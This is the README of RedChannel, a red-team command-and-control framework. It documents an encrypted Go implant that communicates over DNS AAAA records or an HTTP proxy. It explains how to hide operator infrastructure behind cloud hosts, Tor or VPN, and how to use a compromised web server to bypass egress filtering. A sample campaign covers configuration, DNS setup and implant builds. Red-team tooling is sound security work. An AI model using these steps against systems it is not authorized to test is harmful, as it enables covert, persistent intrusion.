# RedChannel C2

RedChannel is a simple end-to-end encrypted implant for red teams, written in JavaScript (server) and Go (agent).

The primary means of communication between agents and their C2 is DNS, but proxying through an HTTP endpoint is also possible. RedChannel uses AAAA records for data transmission and does not rely on TXT records.

## Key Exchange and Session Encryption

Before any data or commands are received, C2 must initiate a key exchange with new agents.

* C2 generates an EC keypair and forwards it's public key to the Agent
* Agent generates its own EC keypair and forwards it to the C2
* Using ECDH, both C2 and Agent compute the same shared secret
* The shared secret is combined with the campaign password to derive an AES key
* All subsequent communication will be encrypted with the derived AES key.
    * A per-encryption block-sized IV is generated and prepended to the encrypted buffer

The C2 can at any point reinitiate the key exchange, invalidating keys used to encrypt and decrypt past traffic and data.

## Proxying Traffic Through HTTP

RedChannel can switch its communication method from DNS to HTTP by using proxy somewhere on the Internet. The benefit of this is primarily speed. DNS communication is very slow, especially if the communication interval is high. Since the proxy payload can be hosted on any third-party server and it is polled by both the implant and the C2, we can effectively tunnel C2 requests through Tor or a VPN, hiding the red team infrastructure. 

The key exchange and session encryption still apply, but instead of issuing DNS queries, agents will instead upload these encrypted blobs to the defined proxy endpoint. The C2 will query this endpoint periodically for data from agents and process it accordingly. 

### Proxy communication via cloud hop
The proxy payload can be uploaded to something like Google Cloud, Amazon or Azure and used as a hop for communication. This eliminates the need to find good domains and manage certificates and it also masks your primary C2 infrastructure. 
```
(target [agent]) ---> (cloud: [https://url/proxy.php]) <--- (red team: [c2])
```
### Proxy communication via target environment hop

Another option is to leverage an internally compromised web server which is exposed to the Internet (eg: some WordPress blog). This would allow fast communication with the C2 via HTTP while also bypassing any egress proxy filtering on the agent host.
```
(target [agent] ---> [https://url/proxy.php]) <--- (red team: [c2])
```

## Configuration

A sample configuration file is available in `./conf/redchannel.conf.sample`. Use this as a template to create campaign configs. These must be properly formatted JSON files.

The master password is set either via the `--password` command-line switch or using the environment variable `RC_PASSWORD`. This value is required.

The agent source code must also be available in the `./agent/` subfolder: ```git submodule update --recurse```

RedChannel will use the `./agent/config/config.go.sample` as a template to build the agent using C2 configuration data (password, c2 domain, etc).

## Running

Command-line switches are available to overwrite configuration values. 

```c
$ git clone --recurse-submodules https://github.com/slackr/redchannel
$ cd redchannel-c2
$ vim ./conf/redchannel.conf
$ node app.js --help
...
```

### Sample Campaign

*Target:* Contoso
*Red Team C2 domain:* redteam.int
*Proxy URL:* https://uber-red-team.azurewebsites.net/proxy.php

* Create `NS` record for `uber.redteam.int` pointing to `ns1.redteam.int`
* Create `A` record for `ns1.redteam.int` pointing to the C2 external `ip` or `socat` forwarder

Create a `./config/campaigns/contoso.conf` (see `conf/redchannel.conf.sample`)
```json
{
    "c2": {
        "domain": "uber.redteam.int",
        "dns_ip": "0.0.0.0",
        "dns_port": 53,
        "web_ip": "127.0.0.1",
        "web_port": 4321,
        "binary_route": "/setup.exe",
        "web_url": "http://uber.redteam.int"
    },
    "proxy": {
        "enabled": false,
        "key": "contoso_proxy_key",
        "interval": 2000,
        "url": "https://uber-red-team.azurewebsites.net/proxy.php"
    },
    "static_dns": {
        "uber.redteam.int": "172.16.1.1"
    }
    ...
}
```

Launch the C2:
```RC_PASSWORD=supersecret node app.js --config ./config/campaigns/contoso.conf```

Generate proxy payload and enable proxy communicaton:

```c
> use proxy
proxy> generate
// proxy payload is displayed, to be uploaded to the proxy server (https://uber-red-team.azurewebsites.net/proxy.php)
proxy> set enabled 1
```

Build the implant binary:

```c
> use implant
implant> set os linux
implant> set arch amd64
implant> set interval 2000
implant> set resolver 1.1.1.1:53
implant> build
* building agent for os: linux, arch: amd64, binary will be available here: [path] and [web_url/binary_route]
// pull the current build log with 'log'
implant> log
// shows the active build log, lots of output...
```
